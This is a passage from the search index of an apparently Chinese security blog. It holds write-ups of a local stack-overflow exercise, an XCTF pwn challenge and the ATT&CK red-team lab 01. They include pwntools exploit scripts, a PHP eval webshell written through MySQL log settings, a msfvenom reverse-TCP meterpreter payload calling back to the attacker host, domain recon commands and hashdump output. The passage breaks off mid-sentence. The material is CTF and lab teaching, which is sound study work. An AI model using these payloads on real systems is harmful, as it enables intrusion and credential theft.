<pre><code>\u2514\u2500# checksec --file=./stack_test                      \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   41 Symbols        No    0               1  ./stack_test\n</code></pre> <p>\u5206\u6790\u6e90\u7801\uff0cmain\u51fd\u6570\u8c03\u7528vulnerable\u51fd\u6570\uff0cvulnerable\u51fd\u6570\u529f\u80fd\u4e3a\u83b7\u53d6\u7528\u6237\u8f93\u5165\u5e76\u6253\u5370</p> <p>\u53ef\u89c1\u8f93\u5165\u51fd\u6570\u5e76\u672a\u5bf9\u8f93\u5165\u8fdb\u884c\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u4ee5\u8003\u8651\u5728\u8f93\u5165\u70b9\u8fdb\u884c\u6ea2\u51fa\u64cd\u4f5c\uff0c\u4ece\u800c\u4fee\u6539\u8fd4\u56de\u5730\u5740\uff0c\u8ba9\u5176\u6307\u5411\u6ea2\u51fa\u6570\u636e\u4e2d\u7684\u4e00\u6bb5\u6307\u4ee4(shellcode)</p> <p>\u63a5\u4e0b\u6765\u4f7f\u7528gdb\u5206\u6790\u7f16\u8bd1\u51fa\u7684elf\u6587\u4ef6</p> <p>\u6211\u4eec\u7684\u76ee\u7684\u662f\u5bf9vulnerable\u51fd\u6570\u4e2d\u7684gets\u8f93\u5165\u70b9\u8fdb\u884c\u6570\u636e\u6ea2\u51fa\uff0c\u4ece\u800c\u4fee\u6539\u5176return\u8fd4\u56de\u503c\u4e3apwn()\u51fd\u6570\uff0c\u8fbe\u5230\u6267\u884cpwn\u51fd\u6570\u7684\u76ee\u7684</p> <p>\u9996\u5148\u627e\u5230vulnerable\u51fd\u6570\u4e2dgets\u83b7\u53d6\u7684\u53d8\u91cfs\u7684\u6bb5\u5185\u504f\u79fb\u5730\u5740\uff1a</p> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0cgets\u51fd\u6570\u4e0b\u4e00\u884c\u5373\u4e3as\u53d8\u91cf\u7684\u6bb5\u5185\u504f\u79fb\u5730\u5740\u4e3a[rbp-0xc]\uff0c0xc\u8f6c\u5316\u4e3a\u5341\u8fdb\u5236\u5373\u4e3a12,\u6240\u4ee5s\u53d8\u91cf\u7684\u504f\u79fb\u957f\u5ea6\u4e3a12,\u5373\u8ddd\u79bb\u6bb5\u57fa\u5730\u5740\u957f\u5ea6\u4e3a12</p> <p>\u7531\u4e8e\u8be5elf\u6587\u4ef6\u4e3a64\u4f4d\uff0c\u5728\u5806\u6808\u4e0a\u53608\u4e2a\u5b57\u8282\uff0c32\u4f4d\u5219\u662f4\u4e2a\u5b57\u8282</p> <p>\u6545\u800c\u6ea2\u51fa\u6570\u636e\u7684\u957f\u5ea6\u4e3a12+8\uff08\u5176\u4e2d12\u662fs\u53d8\u91cf\u5230\u6bb5\u57fa\u5730\u5740\u7684\u957f\u5ea6\uff0c8\u662f\u4e3a\u4e86\u8986\u76d6\u6bb5\u57fa\u5730\u5740\uff09\uff0c\u603b\u768420\u5b57\u8282\u53ef\u4ee5\u4f7f\u5f97\u6570\u636e\u6ea2\u51fa\u521a\u597d\u4e0e\u8fd4\u56de\u5730\u5740\u6301\u5e73\uff0c\u518d\u52a0\u4e0a\u4e00\u6bb5\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\uff0c\u4fbf\u53ef\u4ee5\u4f7f\u5f97\u8fd4\u56de\u5730\u5740\u8fd4\u56de\u4e3a\u76ee\u6807\u5730\u5740</p> <p>\u63a5\u4e0b\u6765\u67e5\u770bpwn\u51fd\u6570\u7684\u5730\u5740</p> <p></p> <p>\u7531\u4e0a\u56fe\u53ef\u4ee5\u770b\u5230\uff0cpwn\u51fd\u6570\u7684\u8d77\u59cb\u5730\u5740\u4e3a0x401136</p> <p>PS:</p> <p>\u4e00\u822c\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u5c0f\u7aef\u5e8f\uff0c\u800c\u901a\u8baf\u534f\u8bae\u662f\u5927\u7aef\u5e8f,\u5982\u9ad8\u4f4d\u662f0x88,\u4f4e\u4f4d\u662f0x66</p> <p>\u5927\u7aef\u5e8f\uff1a</p> <p>\u5c31\u662f\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u7684\uff0c\u9ad8\u4f4d\u5b57\u8282\u5728\u524d\uff0c\u4f4e\u4f4d\u5b57\u8282\u5728\u540e\uff0c\u59820x8866</p> <p>\u5c0f\u7aef\u5e8f\uff1a</p> <p>\u521a\u597d\u4e0e\u5927\u7aef\u5e8f\u76f8\u53cd\uff0c\u4f4e\u4f4d\u5b57\u8282\u5728\u524d\uff0c\u9ad8\u4f4d\u5b57\u8282\u5728\u540e\uff0c\u59820x6688</p> <p>\u6240\u4ee5\uff0cexp\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>from pwn import *\n\nkey=p32(0x401136)//\u81ea\u884c\u7f16\u8bd1elf\u6587\u4ef6\u7684pwn\u51fd\u6570\u7684\u5730\u5740\u53ef\u80fd\u4e0d\u540c\n\nconn  = process(\"./stack_test\")\n\nconn.sendline(bytes('a',encoding='utf8')*20+key)\n\nprint (conn.recvall())\n</code></pre> <p>\u6267\u884cexp\u4ee3\u7801\u53ef\u5f97\u5230\uff1a</p> <p></p>"},{"location":"pwn/xctf--pwn--%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/","title":"xctf--pwn--\u53cd\u5e94\u91dc\u5f00\u5173\u63a7\u5236","text":"<p>\u9996\u5148checksec\u67e5\u770b\u4fdd\u62a4</p> <pre><code>\u2514\u2500# checksec ad72d90fbd4746ac8ea80041a1f661c2 \n[*] '/root/xctf/ad72d90fbd4746ac8ea80041a1f661c2'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n</code></pre> <p>\u67e5\u770b\u51fd\u6570\u5757</p> <pre><code>\u2514\u2500#  objdump -t -j .text ad72d90fbd4746ac8ea80041a1f661c2 \n\nad72d90fbd4746ac8ea80041a1f661c2:     file format elf64-x86-64\n\nSYMBOL TABLE:\n0000000000400500 l    d  .text  0000000000000000              .text\n0000000000400530 l     F .text  0000000000000000              deregister_tm_clones\n0000000000400570 l     F .text  0000000000000000              register_tm_clones\n00000000004005b0 l     F .text  0000000000000000              __do_global_dtors_aux\n00000000004005d0 l     F .text  0000000000000000              frame_dummy\n0000000000400870 g     F .text  0000000000000002              __libc_csu_fini\n0000000000400800 g     F .text  0000000000000065              __libc_csu_init\n0000000000400500 g     F .text  000000000000002a              _start\n00000000004006b0 g     F .text  00000000000000a9              easy\n0000000000400759 g     F .text  0000000000000099              main\n0000000000400607 g     F .text  00000000000000a9              normal\n00000000004005f6 g     F .text  0000000000000011              shell\n</code></pre> <p>\u4f7f\u7528IDA\u5bf9elf\u8fdb\u884c\u5206\u6790</p> <p>\u9996\u5148\u662fmain\u51fd\u6570\uff1a</p> <p></p> <p>\u63a5\u4e0b\u6765\u662feasy\u51fd\u6570\uff1a</p> <p></p> <p>\u63a5\u4e0b\u6765\u662fnormal\u51fd\u6570\uff1a</p> <p></p> <p>\u6700\u540e\u662fshell\u51fd\u6570\uff0c\u6267\u884c\u8be5\u51fd\u6570\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2ashell</p> <p></p> <p>\u63a5\u4e0b\u6765\u8fdb\u884c\u5206\u6790</p> <p>\u6309\u7167\u9898\u76ee\u8981\u6c42\u662f\u4eceV5\u53d8\u91cf\u6ea2\u51fa\u81f3easy\u51fd\u6570\uff0c\u518dV2\u53d8\u91cf\u6ea2\u51fa\u81f3normal\u51fd\u6570\uff0c\u6700\u540e\u518d\u6ea2\u51fa\u81f3shell\u51fd\u6570</p> <p>\u4f46\u662f\u7531\u4e8e\u8be5elf\u6587\u4ef6\u5e76\u672a\u5f00\u542fPIE\u4fdd\u62a4\uff08\u5730\u5740\u968f\u673a\u5316\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bf9main\u51fd\u6570\u4e2d\u7684V5\u53d8\u91cf\u8fdb\u884c\u6ea2\u51fa\u81f3shell\u51fd\u6570</p> <p>\u53ef\u89c1\u5206\u6790\u4e2dV5\u53d8\u91cf\u7684\u504f\u79fb\u5730\u5740\u4e3a [bp-200H]\uff0c\u5373\u4e3a\u5341\u8fdb\u5236\u7684512,\u6545\u800cv5\u53d8\u91cf\u8ddd\u6808\u5e95\u8ddd\u79bb\u957f\u5ea6\u4e3a512\uff0c\u8fd8\u8981\u52a0\u4e0a8\u4e2a\u957f\u5ea6\u4ee5\u8986\u76d6\u6bb5\u57fa\u5730\u5740\uff0864\u4f4d\u4e3a8\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e3a4\u4e2a\uff09</p> <p>\u518d\u5206\u6790\u67e5\u770bshel\u51fd\u6570\u7684\u8d77\u59cb\u5730\u5740\uff0c\u53ef\u89c1\u4e3a0X4005f6</p> <pre><code>gdb-peda$ disass shell\nDump of assembler code for function shell:\n   0x00000000004005f6 &lt;+0&gt;:     push   rbp\n   0x00000000004005f7 &lt;+1&gt;:     mov    rbp,rsp\n   0x00000000004005fa &lt;+4&gt;:     mov    edi,0x400888\n   0x00000000004005ff &lt;+9&gt;:     call   0x4004b0 &lt;system@plt&gt;\n   0x0000000000400604 &lt;+14&gt;:    nop\n   0x0000000000400605 &lt;+15&gt;:    pop    rbp\n   0x0000000000400606 &lt;+16&gt;:    ret    \nEnd of assembler dump.\n</code></pre> <p>\u6240\u4ee5 padyload\u4e3a<code>bytes('a',encoding='utf8')*520+shell_address</code></p> <p>exp\u5982\u4e0b\uff1a</p> <pre><code>from pwn import *\n\nkey = p64(0x4005f6)\n\nconn = remote('61.147.171.105',63873)\n\nconn.recvuntil('&gt;')\n\npayload = bytes('a',encoding='utf8')*520+key\n\nconn.sendline(payload)\n\nconn.interactive()\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff0c\u6210\u529f\u83b7\u53d6flag\uff1a</p> <p></p>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_1","title":"\u62d3\u6251\u73af\u5883\u5982\u4e0b\uff1a","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_2","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_3","title":"\u7f51\u5361\u914d\u7f6e\u5982\u4e0b\uff1a","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#kali-19216855123","title":"kali:\u00a0 192.168.55.123","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#win7-19216855130-19216852143","title":"win7:\u00a0 192.168.55.130\u00a0 &amp;&amp; 192.168.52.143(\u5185\u7f51\u7f51\u5361)","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#win2003-19216852141","title":"win2003:\u00a0 192.168.52.141(\u57df\u5185\u4e3b\u673a)","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#win2008-19216852138","title":"win2008:\u00a0 192.168.52.138(\u57df\u63a7)","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#web","title":"web\u6e17\u900f\uff1a","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#win7ip19216855130803306","title":"\u9996\u5148\uff0c\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u770b\u5230win7\u7684\u4e3b\u673aip\u4e3a192.168.55.130,\u5f00\u653e\u4e8680\u548c3306\u7aef\u53e3","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_4","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#80php","title":"\u8bbf\u95ee80\u7aef\u53e3\uff0c\u51fa\u73b0php\u63a2\u9488\u9875\u9762","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_5","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#web_1","title":"\u626b\u63cfweb\u76ee\u5f55","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_6","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#rootrootphpmyadmin","title":"\u5c1d\u8bd5\u7528root/root\u5f31\u53e3\u4ee4\u767b\u5f55phpmyadmin,\u6210\u529f\u767b\u5f55","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_7","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#secure_file_privenullmysqld","title":"secure_file_prive=null\uff0c\u9650\u5236mysqld\uff0c\u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa\uff1b","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_8","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_9","title":"\u67e5\u8be2\u65e5\u5fd7\u5199\u5165\u662f\u5426\u5f00\u542f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_10","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_11","title":"\u5f00\u542f\u65e5\u5fd7\u5e76\u4fee\u6539\u65e5\u5fd7\u4fdd\u5b58\u8def\u5f84","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#set-global-general_log-on","title":"<code>set global general_log = on;</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#set-global-general_log_filecphpstudywwwshellphp","title":"<code>set global general_log_file='C:\\\\phpStudy\\\\WWW\\\\shell.php';</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_12","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#select-php-eval_postashell","title":"\u7136\u540e<code>select '&lt;?php @eval($_POST[a]);?&gt;'</code>\u5199\u5165shell\u81f3\u65e5\u5fd7\u6587\u4ef6","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#shell","title":"\u5c1d\u8bd5\u8fde\u63a5shell\uff0c\u6210\u529f\u8fde\u63a5","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_13","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#yxcmsgetshell","title":"\u4e5f\u53ef\u4ee5\u901a\u8fc7yxcms\u8fdb\u884cgetshell","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_14","title":"\u5185\u7f51\u6e17\u900f\uff1a","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#msf","title":"\u5236\u4f5c\u4e00\u4e2amsf\u6728\u9a6c\u5e76\u4e0a\u4f20\u81f3\u76ee\u6807\u670d\u52a1\u5668\uff0c\u5e76\u8bbe\u7f6e\u8fde\u63a5","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#msfvenom-p-windowsmeterpreterreverse_tcp-lhost19216855123-lport5678-f-exe-o-shellexe","title":"<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.55.123 LPORT=5678 -f exe -o shell.exe</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_15","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#psmeterpretre-shellchcp-65001","title":"PS\uff1ameterpretre shell\u5982\u679c\u4e71\u7801\uff0c\u53ef\u4ee5\u8f93\u5165<code>chcp 65001</code>\u53bb\u9664\u4e71\u7801","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#godorgip19216852143","title":"\u67e5\u770b\u4e3b\u673a\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u4e3b\u673a\u5c5e\u4e8e<code>god.org</code>\u57df\u4e2d\uff0c\u5185\u7f51\u7f51\u5361ip\u4e3a192.168.52.143","text":"<pre><code>C:\\phpStudy\\WWW&gt;ipconfig /all\nipconfig /all\n\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : stu1\n   Primary Dns Suffix  . . . . . . . : god.org\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : god.org\n\nEthernet adapter \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd 5:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #3\n   Physical Address. . . . . . . . . : 00-0C-29-A7-C1-B2\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::98c:bf05:1e5c:5fbb%26(Preferred) \n   IPv4 Address. . . . . . . . . . . : 192.168.55.130(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : \n   DHCPv6 IAID . . . . . . . . . . . : 721423401\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8\n   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1\n                                       fec0:0:0:ffff::2%1\n                                       fec0:0:0:ffff::3%1\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\nEthernet adapter \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection\n   Physical Address. . . . . . . . . : 00-0C-29-A7-C1-A8\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::fcff:cf71:1487:9c27%11(Preferred) \n   IPv4 Address. . . . . . . . . . . : 192.168.52.143(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.52.2\n   DHCPv6 IAID . . . . . . . . . . . : 234884137\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8\n   DNS Servers . . . . . . . . . . . : 192.168.52.138\n                                       8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#systeminfo","title":"systeminfo\u4fe1\u606f","text":"<pre><code>C:\\phpStudy\\WWW&gt;systeminfo\nsysteminfo\n\nHost Name:                 STU1\nOS Name:                   Microsoft Windows 7 \u4e13\u4e1a\u7248 \nOS Version:                6.1.7601 Service Pack 1 Build 7601\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Member Workstation\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows \u7528\u6237\nRegistered Organization:   \nProduct ID:                00371-177-0000061-85693\nOriginal Install Date:     2019/8/25, 9:54:10\nSystem Boot Time:          2023/2/1, 10:41:12\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz\nBIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12\nWindows Directory:         C:\\Windows\nSystem Directory:          C:\\Windows\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             zh-cn;Chinese (China)\nInput Locale:              zh-cn;Chinese (China)\nTime Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi\nTotal Physical Memory:     2,047 MB\nAvailable Physical Memory: 1,284 MB\nVirtual Memory: Max Size:  4,095 MB\nVirtual Memory: Available: 3,218 MB\nVirtual Memory: In Use:    877 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    god.org\nLogon Server:              \\\\OWA\nHotfix(s):                 4 Hotfix(s) Installed.\n                           [01]: KB2534111\n                           [02]: KB2999226\n                           [03]: KB958488\n                           [04]: KB976902\nNetwork Card(s):           5 NIC(s) Installed.\n                           [01]: Intel(R) PRO/1000 MT Network Connection\n                                 Connection Name: \u672c\u5730\u8fde\u63a5\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 192.168.52.143\n                                 [02]: fe80::fcff:cf71:1487:9c27\n                           [02]: TAP-Windows Adapter V9\n                                 Connection Name: \u672c\u5730\u8fde\u63a5 2\n                                 Status:          Media disconnected\n                           [03]: Microsoft Loopback Adapter\n                                 Connection Name: Npcap Loopback Adapter\n                                 DHCP Enabled:    Yes\n                                 DHCP Server:     255.255.255.255\n                                 IP address(es)\n                                 [01]: 169.254.129.186\n                                 [02]: fe80::b461:ccad:e30f:81ba\n                           [04]: TAP-Windows Adapter V9\n                                 Connection Name: \u672c\u5730\u8fde\u63a5 3\n                                 Status:          Media disconnected\n                           [05]: Intel(R) PRO/1000 MT Network Connection\n                                 Connection Name: \u672c\u5730\u8fde\u63a5 5\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 192.168.55.130\n                                 [02]: fe80::98c:bf05:1e5c:5fbb\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#getsystem","title":"\u5c1d\u8bd5getsystem\u5e76\u6210\u529f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_16","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":"<pre><code>\u4fe1\u606f\u6536\u96c6\nipconfig /all \u67e5\u8be2\u672c\u673aIP\u6bb5\uff0c\u6240\u5728\u57df\u7b49\nnet config Workstation \u5f53\u524d\u8ba1\u7b97\u673a\u540d\uff0c\u5168\u540d\uff0c\u7528\u6237\u540d\uff0c\u7cfb\u7edf\u7248\u672c\uff0c\u5de5\u4f5c\u7ad9\u57df\uff0c\u767b\u9646\u57df\nnet user \u672c\u673a\u7528\u6237\u5217\u8868\nnet localhroup administrators \u672c\u673a\u7ba1\u7406\u5458[\u901a\u5e38\u542b\u6709\u57df\u7528\u6237]\nnet user /domain \u67e5\u8be2\u57df\u7528\u6237\nnet user \u7528\u6237\u540d /domain \u83b7\u53d6\u6307\u5b9a\u7528\u6237\u7684\u8d26\u6237\u4fe1\u606f\nnet user /domain b404 pass \u4fee\u6539\u57df\u5185\u7528\u6237\u5bc6\u7801\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\nnet group /domain \u67e5\u8be2\u57df\u91cc\u9762\u7684\u5de5\u4f5c\u7ec4\nnet group \u7ec4\u540d /domain \u67e5\u8be2\u57df\u4e2d\u7684\u67d0\u5de5\u4f5c\u7ec4\nnet group \u201cdomain admins\u201d /domain \u67e5\u8be2\u57df\u7ba1\u7406\u5458\u5217\u8868\nnet group \u201cdomain controllers\u201d /domain \u67e5\u770b\u57df\u63a7\u5236\u5668(\u5982\u679c\u6709\u591a\u53f0)\nnet time /domain \u5224\u65ad\u4e3b\u57df\uff0c\u4e3b\u57df\u670d\u52a1\u5668\u90fd\u505a\u65f6\u95f4\u670d\u52a1\u5668\nipconfig /all \u67e5\u8be2\u672c\u673aIP\u6bb5\uff0c\u6240\u5728\u57df\u7b49\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_17","title":"\u6536\u96c6\u57df\u5185\u4fe1\u606f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_18","title":"\u67e5\u770b\u57df\u7528\u6237","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_19","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_20","title":"\u67e5\u770b\u57df\u7ba1","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_21","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_22","title":"\u5b9a\u4f4d\u57df\u63a7\uff0c\u57df\u63a7\u4e00\u822c\u90fd\u4e3a\u65f6\u95f4\u670d\u52a1\u5668","text":"<pre><code>C:\\Windows\\system32&gt;net time /domain\nnet time /domain\nCurrent time at \\\\owa.god.org is 2023/2/1 11:41:04\n\nThe command completed successfully.\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#ip19216852138","title":"\u786e\u5b9a\u57df\u63a7ip\u4e3a<code>192.168.52.138</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_23","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_24","title":"\u63a5\u4e0b\u6765\u8fc1\u79fb\u4f1a\u8bdd\u8fdb\u7a0b","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_25","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#hashdump","title":"hashdump","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#ps-ridlm-hash-nt-hash-rid-windows-linux-uidgid-500-administrator501-guest-lm-hash-nt-hash-hash-cmd5","title":"PS:\u683c\u5f0f\u662f\uff1a\u7528\u6237\u540d\u79f0: RID:LM-HASH \u503c: NT-HASH \u503c\uff0crid \u662f windows \u7cfb\u7edf\u8d26\u6237\u5bf9\u5e94\u56fa\u5b9a\u7684\u503c\uff0c\u7c7b\u4f3c\u4e8e linux \u7684 uid\uff0cgid \u53f7\uff0c500 \u4e3a administrator\uff0c501 \u4e3a guest \u7b49\u3002\u800c lm \u7684 hash \u548c nt \u7684 hash,\u90fd\u662f\u5bf9\u7528\u6237\u5bc6\u7801\u8fdb\u884c\u7684\u52a0\u5bc6\uff0c\u53ea\u4e0d\u8fc7\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002\u590d\u5236\u5176\u4e2d\u4e00\u79cd\u52a0\u5bc6\u7684 hash \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5728\u7ebf cmd5 \u7834\u89e3","text":"<pre><code>meterpreter &gt; hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nliukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#systemload-kiwicreds_allhongrisec2019","title":"\u7531\u4e8e\u5df2\u7ecf\u83b7\u5f97system\u6743\u9650\uff0c\u53ef\u4ee5\u52a0\u8f7d<code>load 